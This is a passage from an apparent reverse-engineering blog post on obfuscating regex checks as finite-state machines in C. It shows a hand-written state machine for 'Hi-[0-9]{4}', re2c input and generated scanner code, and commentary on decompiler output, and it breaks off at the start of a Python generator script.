<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>> fsm_example.exe garbage-Hi-1337-garbage
</span><span class='line'>Good boy.
</span><span class='line'>
</span><span class='line'>> fsm_example.exe garbage-Hi-1337
</span><span class='line'>Good boy.
</span><span class='line'>
</span><span class='line'>> fsm_example.exe Hi-1337-garbage
</span><span class='line'>Good boy.
</span><span class='line'>
</span><span class='line'>> fsm_example.exe Hi-dudies
</span><span class='line'>Bad boy.</span></code></pre></td></tr></table></div></figure>


<p>The purpose of that trivial example was just to show you how a regex string representation can be compiled into something harder to analyze but also more efficient (it doesn&rsquo;t need a compilation step, that&rsquo;s the reason why you may encounter that kind of thing in real (?) softwares). Even if the code seems trivial at the first sight, when you look at it at the assembly level, it takes a bit of time to figure out it&rsquo;s a simple &ldquo;Hi-[0-9]{4}&rdquo; regex.</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/cfg.png"></p>

<p>In that kind of analysis, it&rsquo;s really important to find the &ldquo;state&rdquo; variable that allows the program to pass through the different nodes of the FSM. Then, you have also to figure out how you can reach a specific node, and all the nodes reachable from a specific one. To make it short, at the end of your analysis you really want to have a clean FSM like the one we did earlier. And once you have it, you want to eliminate unreachable nodes, and to minimize it in order to remove some potential automaton obfuscation.</p>

<figure class='code'><figcaption><span> (fsm_example.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_example.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">state</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">do</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">switch</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">case</span> <span class="mi">0</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;H&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">1</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;i&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">2</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;-&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">3</span> <span class="p">...</span> <span class="mi">6</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">s</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">7</span>:
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="o">++</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Automatically</h2>

<p>But what if our regex was totally more complex ? It would be a hell to implement manually the FSM. That&rsquo;s why I wanted to find some ways to generate your own FSM from a regex string manipulation.</p>

<h3>With re2c</h3>

<p><a href="http://re2c.org/manual.html">re2c</a> is a cool and simple tool that allows you to describe your regex in a C comment, then it will generate the code of the scanner. As an example, here is the source code to generate the scanner for the previous regex:</p>

<figure class='code'><figcaption><span> (fsm_re2c_example.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_re2c_example.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* re2c -i fsm_re2c_example.c */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'><span class="cm">/*!re2c</span>
</span><span class='line'><span class="cm">    re2c:define:YYCTYPE = &quot;char&quot;;</span>
</span><span class='line'><span class="cm">    re2c:define:YYCURSOR = s;</span>
</span><span class='line'><span class="cm">    re2c:define:YYMARKER = q;</span>
</span><span class='line'><span class="cm">    re2c:yyfill:enable   = 0;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">   &quot;Hi-&quot;[0-9]{4}  { return 1; }</span>
</span><span class='line'><span class="cm">   [^]            { return 0; }</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once you feed that source to re2c, it gives you that scanner ready to be compiled:</p>

<figure class='code'><figcaption><span> (fsm_re2c_generated_non_optimized.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_re2c_generated_non_optimized.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* Generated by re2c 0.13.5 on Sun Aug 25 00:27:48 2013 */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">yych</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;H&#39;</span>:       <span class="k">goto</span> <span class="n">yy2</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy4</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy2:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">q</span> <span class="o">=</span> <span class="o">++</span><span class="n">s</span><span class="p">);</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;i&#39;</span>:       <span class="k">goto</span> <span class="n">yy5</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy3</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy3:</span>
</span><span class='line'>        <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="nl">yy4:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">yy3</span><span class="p">;</span>
</span><span class='line'><span class="nl">yy5:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;-&#39;</span>:       <span class="k">goto</span> <span class="n">yy7</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy6:</span>
</span><span class='line'>        <span class="n">s</span> <span class="o">=</span> <span class="n">q</span><span class="p">;</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">yy3</span><span class="p">;</span>
</span><span class='line'><span class="nl">yy7:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy8</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy8:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy9</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy9:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy10</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy10:</span>
</span><span class='line'>        <span class="n">yych</span> <span class="o">=</span> <span class="o">*++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="k">switch</span> <span class="p">(</span><span class="n">yych</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;0&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;1&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;2&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;3&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;4&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;5&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;6&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;7&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;8&#39;</span>:
</span><span class='line'>        <span class="k">case</span> <span class="sc">&#39;9&#39;</span>:       <span class="k">goto</span> <span class="n">yy11</span><span class="p">;</span>
</span><span class='line'>        <span class="nl">default:</span>        <span class="k">goto</span> <span class="n">yy6</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="nl">yy11:</span>
</span><span class='line'>        <span class="o">++</span><span class="n">s</span><span class="p">;</span>
</span><span class='line'>        <span class="p">{</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Cool isn&rsquo;t it ? But in fact, if you try to compile and Hexrays it (even with optimizations disabled) you will be completely disappointed: it gets simplified like <strong>really</strong> ; not cool for us (cool for the reverse-engineer though!).</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/hexrays.png"></p>

<h3>By hand</h3>

<p>That&rsquo;s why I tried to generate myself the C code of the scanner. The first thing you need is a <a href="http://osteele.com/software/python/fsa/reCompiler.html">&ldquo;regular-expression string&rdquo; to FSM Python library</a>: a sort-of regex compiler. Then, once you are able to generate a FSM from a regular expression string, you are totally free to do whatever you want with the automaton. You can obfuscate it, try to optimize it, etc. You are also free to generate the C code you want.
Here is the ugly-buggy-PoC code I wrote to generate the scanner for the regex used previously:</p>

<figure class='code'><figcaption><span> (generate_c_fsm.py)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/generate_c_fsm.py'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
